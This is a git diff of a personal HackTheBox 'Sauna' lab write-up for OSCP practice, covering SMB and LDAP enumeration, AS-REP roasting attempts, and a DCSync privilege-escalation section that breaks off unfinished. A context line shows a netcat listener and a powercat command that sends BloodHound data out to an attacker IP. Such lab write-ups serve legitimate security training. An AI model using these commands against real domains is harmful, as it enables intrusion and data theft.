@@ -2,16 +2,20 @@
 Name: Sauna
 Date:  
 Difficulty:  Easy
-Description:  
-Better Description:  
 Goals:  OSCP Prep
 Learnt:
 
+
+
 ## Recon
 
+The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
 ![ping](Screenshots/ping.png)
+
+Domain Name from Enum4linux
 ![domain](Screenshots/domainname.png)
 
+Smbconnection attempts
 ```bash
 smbclient -L 10.129.102.151 -U guest -p ""
 Password for [WORKGROUP\guest]:
@@ -22,12 +26,12 @@ Discovery nmap script has an ldap enumeration script:
 ```
 dnsHostName: SAUNA.EGOTISTICAL-BANK.LOCAL
 defaultNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL
-
 ```
 
 Potential usernames
 ![team](Screenshots/theteampic.png)
 
+First failed attempt
 ![impacketone](Screenshots/impacket-getnpusers-one.png)
 
 ```
@@ -135,11 +139,9 @@ nc -lvnp 54321 > Bloodhound.zip
 powercat -c 10.10.10.10 -p 54321 -i C:\Users\FSmith\Documents\SharpHound\BloodHound.zip
 ```
 
-![](Screenshots/dcsync-bh.png)
-
-
-
-
 ## PrivEsc
 
-      
+Returning to this after many months, I left with credential to get on the box and I just once again run into a compilation issue while I am busy download everything for Visual Studios...
+![](Screenshots/dcsync-bh.png)
+
+I do not want to waste time running into compilation issues for Windows ever again. So 
